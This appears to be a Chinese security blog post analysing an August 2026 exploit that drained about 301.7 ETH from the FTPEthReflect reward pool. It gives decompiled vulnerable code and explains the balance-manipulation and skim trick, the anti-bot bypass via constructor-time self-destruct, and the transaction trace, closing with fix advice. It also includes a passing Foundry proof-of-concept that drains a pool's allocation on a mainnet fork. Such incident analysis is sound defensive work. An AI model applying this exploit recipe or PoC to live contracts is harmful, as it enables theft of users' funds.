---
title: "FTPEthReflect Attack Analysis"
date: 2026-08-07T11:39:38+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["security", "attack", "FTPEthReflect"]
---

2026-08，以太坊主网区块 25606412，攻击者从 FTPEthReflect 合约的共享 ETH 池中提走了 301.704684 ETH。

<!--more-->

## 1. 概述

2026-08，以太坊主网区块 25606412，一笔交易（`0x90f40d3c3b60370f7287d51d972ef54596c46e98f21af91b03a4e84c5e410f64`）从 FTPEthReflect 合约（`0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB`，下称 target）的共享 ETH 池中提走了 301.704684 ETH。

- 攻击前池子余额：400.651 ETH
- 攻击后池子余额：≈ 99 ETH
- 攻击者 EOA：`0x61e7Ad696215688d274C729A4cD0FbbC88FC4f85`
- 闪贷来源：Morpho（`0xBBBBbbBBbb9CC5e90e3b3Afa64bdAf62C37eEFfCb`），单笔 13,997.8 WETH

根本原因是 target 的买入记账函数 `trackPurchase` 把 **pair 的 WETH 现货余额差**当成"新流入奖励"记账，而该余额是可被任意转账直接操纵的现货状态。本文给出完整的漏洞机理、攻击路径设计与真实攻击复盘，并附反编译源码（dedaub，unverified；关键语义均经本地 fork 复现确认）。

## 2. 目标合约与业务模型

target 是一个"共享 ETH 反射奖励服务"：白名单代币（dataSource，共 28 个，全部为 2021 年部署的 meme 币）接入后，用户买卖代币时由代币合约回调 target 记账，用户凭记账从共享池按比例提款。

核心存储（slot 语义，经链上数据与本地复现确认）：

| 存储             | 语义                                          |
| ---------------- | --------------------------------------------- |
| mapping_2        | 白名单（dataSource → bool）                   |
| mapping_4        | trackPurchase 基线：上次记录的 pair WETH 余额 |
| mapping_5        | 记账点累计                                    |
| mapping_6        | 真实注入累计（仅 trackSell 增加）             |
| mapping_b        | 每个 ds 的提款 cap（真实资金分账）            |
| mapping_11/12/13 | holder 的已提记账点 / 当次可提部分 / 快照残余 |
| stor_17          | 100000（分母）                                |
| stor_18          | 305（费率）                                   |

资产负债表（分析块 25606411）：池子 400.651 ETH，Σ mapping_b = 400.511 ETH。**cap 精确分账——正常路径下无人能提取超出自己分账的金额。** 问题只可能出在"分账怎么被记出来"。

## 3. 漏洞：现货余额差被当作新流入

代币买入时回调 `trackPurchase(holder)`（选择器 0x3627301e）。反编译源码（AI 重构版）：

```solidity
function func_3627301e(address varg0) public {
    require(mapping_2[msg.sender], "Unauthorized");
    require(_getOwnership[msg.sender], "Uninitialized");

    address rewardToken = mapping_d[msg.sender];
    require(rewardToken.code.length > 0);

    uint256 v1 = IERC20Like(rewardToken).balanceOf(mapping_9[msg.sender]); // ← 读 pair 的 WETH 现货余额
    mapping_4[msg.sender] = v1;                                            // 基线更新
    // ...（dedaub 伪影：delta 计算的写读时序在反编译中有混淆，
    //      真实语义经 fork 复现裁决为 max(0, balanceOf(pair) - m4)）

    uint256 v9 = (v1 - m4) * mapping_8[msg.sender] / stor_17
               - ((v1 - m4) * mapping_8[msg.sender] / stor_17) * stor_18 / stor_17;
    // 记账 = max(0, 余额差) × alloc% × (1 - 费率)

    mapping_5[msg.sender] += v9;
    mapping_11[msg.sender][varg0] = mapping_5[msg.sender];

    uint256 v12 = stor_17 - mapping_7[msg.sender] + _trackSell[msg.sender][varg0];
    mapping_12[msg.sender][varg0] = v12 * v9 / stor_17;  // 当次可提部分

    _withdraw[msg.sender][varg0] = true;
}
```

记账公式（fork 复现确认）：

```
记账 = max(0, WETH.balanceOf(pair) − m4) × alloc% × (1 − 305/100000)
```

问题在于：

1. **`WETH.balanceOf(pair)` 是现货余额**——任何地址可以用一笔普通 `WETH.transfer(pair, X)` 直接抬高，不需要真实买入，不产生任何滑点或税费；
2. **基线 m4 只在买入时更新**——卖出、转账、捐赠都不会刷新基线；
3. **记账记给"当次触发回调的 holder"**——攻击者可以让自己成为那个 holder。

因此攻击者可以把 pair 的 WETH 余额灌大 X，触发一次买入回调，即获得 ≈ X × alloc% × 0.997 的记账，再按记账提款。基线 m4 被推高后，同样的手法需要更大的注入才能再次产生差额——但每个 ds 只需攻击一次（提空其 cap）。

## 4. 攻击路径设计中的三个核心问题

### 4.1 如何触发记账（代币回调条件）

代币侧的记账触发逻辑（已验证源码 CoinMerge.sol，0x119007...）：

```solidity
function _trackEthReflection(address _sender, address _recipient) private {
    if (_pleb(_sender, _recipient)) {
        if (_isBuy(_sender))
            EthReflect.trackPurchase(_recipient);
        else if (m_EthReflectAmount > 0){
            EthReflect.trackSell(_sender, m_EthReflectAmount);
            m_EthReflectAmount = 0;
        }
    }
}
```

`_isBuy(_sender)` 即 `_sender == m_UniswapV2Pair`：**只有"pair 向外部转出代币"这一种转账会触发 trackPurchase**。这是 Uniswap V2 pair 的 `swap`（买入输出）和 `skim`（冗余退还）都能满足的形态。

### 4.2 注入的资本如何完整回收（核心）

直接转账灌大余额后，pair 的 `reserves` 不随转账更新，`swap` 取回会被 K 校验拦截（双输出时 `amount1In` 被记为 2X，差 0.3% 无法通过；死池上受 `amountOut < reserve` 限制）。**灌进去的 X 拿不回来，攻击就不成立**（等于用 X 换 4.5% 的记账）。

解法是 Uniswap V2 的 `skim`：

```solidity
// UniswapV2Pair.sol
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(_reserve0));
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(_reserve1));
}
```

`skim` 把「余额 − 储备」的冗余原路退还，**且不更新 reserves**。注入 X 后调用 `skim(attacker)`：

- **token0 是币**时：先转出币（`sender = pair` → 触发 `trackPurchase(attacker)`，此时 WETH 余额仍含 X，记账 delta = X）→ 再转出 WETH（X 全额回收）；
- 完成后 pair 的 reserves 与攻击前完全一致，**净成本 ≈ 0**。

可打性前提：**pair.token0 必须是币**。token0 = WETH 的 pair 上，skim 先转 WETH（X 已还原）再转币，回调触发时 delta 读数已归零（实测确认此形态不可打）。

另一个前提是 pair 必须有币的冗余（balance0 > reserve0）。对比攻击块与分析块的链上余额，攻击者**提前几个区块捐了约 1e18 的币**（攻击块 pair 余额比分析块多 0.89e18，恰为 1e18 扣 10% 税后）；实测**任意大于 0 的转账即足以触发回调**（真实攻击中 DIAMND 的 skim 输出仅 320238 wei）。

### 4.3 提款 cap 的 return 陷阱

提款计算 `_calcWithdrawable`（反编译，AI 重构版）的 else 分支有一个非直觉的 return 逻辑：

```solidity
} else {
    uint256 v5 = mapping_13[varg2][varg1];   // 快照残余
    uint256 v6 = mapping_12[varg2][varg1];   // 当次可提
    uint256 v7 = _SafeAdd(v5, v6);
    if (v7 > mapping_b[varg2]) {
        if (v5 > mapping_b[varg2]) {
            if (v6 > mapping_b[varg2]) {
                return 0;
            } else {
                return v6;
            }
        } else {
            return v5;                        // ← 当 m13 ≤ cap < m12 时返回 m13（≈0），而非 min
        }
    } else {
        return _SafeAdd(v5, v6);
    }
}
```

当"当次可提 m12"超过该 ds 的 cap（mapping_b）时，返回的是快照残余 m13（接近 0）而非 min(可提, cap)。**注入量必须精确落在 m12 ≤ cap 的安全区**：本地复现中 X = 738 安全（提 33.06 ETH），X = 741 则整笔提款归零。攻击者需要按每个 ds 的 alloc 和 m7 系数反推精确注入额。

## 5. 反机器人模块与绕过

所有接入代币共享一个反 bot 实例 `0xCD5312d086f078D1554e8813C27Cf6C9D1C3D9b3`，在代币 `_transfer` 中拦截交易（CoinMerge.sol）：

```solidity
if(_isTrade(_sender, _recipient)){
    require(!AntiBot.scanAddress(_recipient, m_UniswapV2Pair, tx.origin), "Beep Beep Boop, You're a piece of poop");
    require(!AntiBot.scanAddress(_sender, m_UniswapV2Pair, tx.origin),  "Beep Beep Boop, You're a piece of poop");
    AntiBot.registerBlock(_sender, _recipient, tx.origin);
}
```

`scanAddress` 反编译（AI 重构版）：

```solidity
function scanAddress(address _address, address safeAddress, address _origin) external view returns (bool) {
    bool hasRequired = _hasRequiredBalance(msg.sender); // 币合约在 PGreen/PGold 余额 >= stor_4
    if (hasRequired) {
        bool scanned = _scanAddress[_address] || _scanAddress[_origin];  // 黑名单
        if (!scanned) {
            v3 = _isContract(_address);   // ← 有 code 的地址 → ban
        } else {
            v3 = true;
        }
        if (_isSameBlock(_address)) v3 = true;  // ← 本区块被 registerBlock 过 → ban
        if (_isSameBlock(_origin)) v3 = true;
        bool exempt = _address == router || _address == msg.sender
                   || _address == safeAddress || _address == address(this)
                   || mapping_9[_address];
        if (exempt) v3 = false;
    } else {
        v3 = false;
    }
    return v3;
}
```

三层规则及对应绕过（均在本地复现验证）：

1. **`_isContract(_address)`：收款方是合约 → ban**。绕过：收款方用"构造中的合约"。攻击合约在 CREATE 构造函数内完成全部操作（收币、触发回调、提款），**构造函数从不 RETURN runtime code，末尾直接 SELFDESTRUCT**。EVM 语义下，代码写入状态树之前，外部对其 `EXTCODESIZE/EXTCODEHASH` 查询恒为 0——反 bot 视角与"未部署地址"无法区分，检查放行。交易结束账户被完全清空（同交易创建+自毁，Cancun 升级后的旧式全清语义），链上查 code 为空、nonce 为 0，事后无法按地址恢复合约结构。
2. **`_isSameBlock`：同区块交易过的地址再操作 → ban**。绕过：建立冗余的捐币提前几个区块完成；注入/提款操作与捐币分离，且发起闪贷的 EOA（tx.origin）全程干净。
3. **外层门槛 `_hasRequiredBalance`**：币合约在 ProjektGreen（`0x529bCdD9Dd315be4Bd19E5AC0A82652cDf28fF83`）/ ProjektGold（`0xDFC628A33C18e856Cd1c59583cB5aCe8dB706F14`）持有 ≥ stor_4 余额才启用检查——所有 13 个被攻击的币合约均满足，此门槛不构成阻碍。

另外攻击者对 13 个 pair 各使用一个新建的一次性合约调用 `skim`，避免同一调用者的记录污染后续 pair 的操作。

## 6. 真实攻击交易复盘

攻击交易完整执行序列（sol-hex trace 导出 + 链上交叉验证）：

1. 攻击者 EOA 部署攻击合约（交易 `to` 为空，initcode 6205 字节，构造期完成全部逻辑后自毁）；
2. Morpho 闪贷 13,997.8 WETH；
3. 循环 13 个 pair，每个 pair 重复同一模式（以 DIAMND pair `0xd51b4c...` 为例，注入 740 ETH）：

| 步骤 | 操作                                                         |
| ---- | ------------------------------------------------------------ |
| 1    | `WETH.transfer(pair, 740e18)`（注入，抬高现货读数）          |
| 2    | 新建合约调用 `pair.skim(攻击合约)`                           |
| 3    | pair 转出币（`sender = pair` → `scanAddress` 放行 → `registerBlock` → `trackPurchase(攻击合约)`，记账 delta ≈ 740） |
| 4    | pair 转出 WETH 740e18 全额（X 完整回收）                     |
| 5    | 回收资金转入路由合约，进入下一个 pair                        |

4. 归还 Morpho 闪贷；
5. `massWithdraw()` 提走 301.704684 ETH；
6. 向区块矿工 `0xdaDB0d80178819F2319190D340ce9A924f783711` 转账精确 1 ETH（0xde0b6b3a7640000）——构造函数内置的 `CALL(COINBASE, 1 ether)` 矿工贿赂；真正的 SELFDESTRUCT 受益地址为 `0x7bd736631afbe1d3795a94f60574f7fa0ae89347`（余额 0.0051 ETH）。

13 个 pair 的注入额：7565 / 5585 / 11030 / 740 / 5170 / 7100 / 1660 / 2140 / 403 / 440 / 86 / 135 / 60 ETH，全部瞬时回收。全部 `scanAddress` 调用返回 0（放行），全程无回滚。

## 7. 本地复现验证

在 fork（区块 25606411）中复现完整攻击（以 ds1 ProjektDiamond 为例）：

- 提前捐币建立 token0 冗余（跨块，绕反 bot 同块记录）；
- Aave V3 flashLoan 借入 740 WETH；
- 注入 → `skim`（收款方为构造期/未部署地址，`scanAddress` 放行）→ `trackPurchase` 记账；
- CREATE2 部署收款合约，以自身身份 `withdraw`；
- X 全额回收，归还闪贷（0.05% 溢价）。

结果：mapping_b[ds1] 从 33.177 ETH 提空至 0.028 ETH（剩余 < 0.1%），pair WETH 余额还原至 12.05 ETH，闪贷完整归还，全部断言通过。

分账推算与真实攻击对照：

| 项目                                | 数值           |
| ----------------------------------- | -------------- |
| 池子总量                            | 400.65 ETH     |
| Σ mapping_b（28 ds）                | 400.51 ETH     |
| 可打 ds（token0=币，17 个）分账合计 | ≈ 306 ETH      |
| 真实攻击提走                        | 301.704684 ETH |

两者差约 4 ETH，对应两个分账为 0 的 ds 及取整/税费，数值自洽。

## 8. 修复建议

1. **记账读数改为真实流入**：`trackPurchase` 不应读 `WETH.balanceOf(pair)` 现货差，应改为在 `swap`/`sync` 时由 pair 侧上报真实输入的 WETH 数量（或由代币合约在买入回调中携带实际输入额），基线只在真实交易时更新。
2. **基线同步**：任何会改变 pair WETH 余额的外部操作（转账、`skim`、`sync`）后，应允许刷新基线或直接拒绝异常差额（例如要求差值必须伴随真实的 swap 输入记录）。
3. **cap 的 return 逻辑修正**：`_calcWithdrawable` else 分支应返回 `min(m13 + m12, mapping_b)` 而非在 m12 超 cap 时返回 m13。
4. **反 bot 的 `isContract` 检查**：仅靠 `EXTCODEHASH` 无法区分"构造中合约"与未部署地址，如需阻断合约调用者，应结合创建历史/白名单等链上可验证信息，或接受该 EVM 语义限制。

## 附录1 ：关键地址

| 角色                            | 地址                                                         |
| ------------------------------- | ------------------------------------------------------------ |
| Target（被攻击合约）            | 0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB                   |
| 攻击交易                        | 0x90f40d3c3b60370f7287d51d972ef54596c46e98f21af91b03a4e84c5e410f64（块 25606412） |
| 攻击者 EOA                      | 0x61e7Ad696215688d274C729A4cD0FbbC88FC4f85                   |
| 攻击合约（构造期自毁）          | 0x12D6fe4822325BbA82FAf6CF706e6b6885C922f9                   |
| 闪贷执行合约                    | 0xA34bf19a63079fbb3f3f0756D552a3dc0f5f4885                   |
| 闪贷提供商                      | Morpho 0xBBBBbbBBbb9CC5e90e3b3Afa64bdAf62C37eEFfCb           |
| 反 bot 实例                     | 0xCD5312d086f078D1554e8813C27Cf6C9D1C3D9b3                   |
| ProjektDiamond（ds1，alloc 8%） | 0x53109fe9e044F2c324D00AD85bfB0b13CE379480                   |
| DIAMND/WETH pair                | 0xd51b4c6bef349571aac48793d830DA975d25F920                   |
| WETH                            | 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2                   |
| 矿工收款（1 ETH 贿赂）          | 0xdaDB0d80178819F2319190D340ce9A924f783711                   |
| SELFDESTRUCT 受益地址           | 0x7bd736631afbe1d3795a94f60574f7fa0ae89347                   |

## 附录2: POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "../src/interfaces.sol";
import "../src/FTPAttacker.sol";

// ============================================================
// POC（真实闪贷 + anti-bot 绕过版）：
// 注入 X -> skim(未部署地址) -> trackPurchase 记账 -> CREATE2 部署 ->
// sub 提款 -> X 回收 -> 还闪贷
// ============================================================
contract POC_FlashLoan2 is Test {
    address constant DS1    = 0x53109fe9e044F2c324D00AD85bfB0b13CE379480;
    address constant PAIR1  = 0xd51b4c6bef349571aac48793d830DA975d25F920;
    address constant WETH   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    function _map(address key, uint256 slot) internal view returns (uint256 v) {
        v = uint256(vm.load(0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB, keccak256(abi.encode(key, uint256(slot)))));
    }

    function test_poc_flashloan2_ds1() public {
        vm.createSelectFork("mainnet", 25606411);
        uint256 X = 740 ether;
        bytes32 salt = bytes32(uint256(0xABCDEF));

        // 部署攻击合约
        FTPAttacker attacker = new FTPAttacker(
            IFTP(0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB),
            IPair(PAIR1)
        );

        // ---- PREP：donor 买入 D 并捐给 pair，建立 token0 冗余 ----
        //（真实攻击 trace [68]：攻击块 pair 余额比分析块多 ~0.9e18，即此步骤）
        address donor = address(0xD0A0);
        address[] memory path = new address[](2);
        path[0] = WETH; path[1] = DS1;
        vm.deal(donor, 1 ether);
        vm.prank(donor, donor);
        IUniswapV2Router(ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 0.005 ether
        }(0, path, donor, block.timestamp);
        uint256 D = IERC20L(DS1).balanceOf(donor);
        vm.roll(block.number + 1); // 跨块：donor 买入（块N）后捐 D（块N+1），绕过同块 ban
        vm.warp(block.timestamp + 12);
        vm.prank(donor, donor);
        IERC20L(DS1).transfer(PAIR1, D); // 捐币（donor 被 anti-bot 记录，无妨）
        emit log_named_uint("donor donated D (token0 excess)", D);
        vm.roll(block.number + 1); // 攻击块（块N+2）：攻击者 EOA 的 tx.origin 干净
        vm.warp(block.timestamp + 12);

        // ---- 攻击前事实 ----
        uint256 mbBefore = _map(DS1, 0xb);
        emit log_named_uint("mapping_b[ds1] before (loot)", mbBefore);

        // ---- 攻击（单笔交易）：Aave V3 flash loan ----
        vm.prank(address(0xE0A), address(0xE0A));
        attacker.attack(X, DS1, salt);

        // ---- 断言 ----
        address sub = attacker.sub();
        emit log_named_address("CREATE2 sub", sub);
        emit log_named_uint("sub code size (deployed)", sub.code.length);
        // (1) 闪贷归还（攻击合约无 WETH 残留债）
        assertEq(IWETH(WETH).balanceOf(address(attacker)), 0, "flash loan repaid");
        // (2) sub 有 code（CREATE2 部署成功）
        assertGt(sub.code.length, 0, "sub deployed");
        // (3) mapping_b 被提空（<=1%）
        uint256 mbAfter = _map(DS1, 0xb);
        assertLt(mbAfter, mbBefore / 100, "mapping_b drained");
        // (4) pair 还原
        assertLt(IWETH(WETH).balanceOf(PAIR1), 12.06 ether, "pair WETH restored");

        emit log_string("=== RESULT ===");
        emit log_named_uint("loot (ds1 mapping_b)", mbBefore);
        emit log_named_uint("mapping_b remaining", mbAfter);
        emit log_named_uint("pair1 WETH after", IWETH(WETH).balanceOf(PAIR1));
    }
}

```

```
Ran 1 test for test/POC_FlashLoan2.t.sol:POC_FlashLoan2
[PASS] test_poc_flashloan2_ds1() (gas: 2249326)
Logs:
  donor donated D (token0 excess): 19555328983155476172
  mapping_b[ds1] before (loot): 33177669786614313570
  CREATE2 sub: 0x421884b55C08749ee74fadCc86E2966FC0799DE6
  sub code size (deployed): 683
  === RESULT ===
  loot (ds1 mapping_b): 33177669786614313570
  mapping_b remaining: 28244107502086514
  pair1 WETH after: 12053483177909074818
```

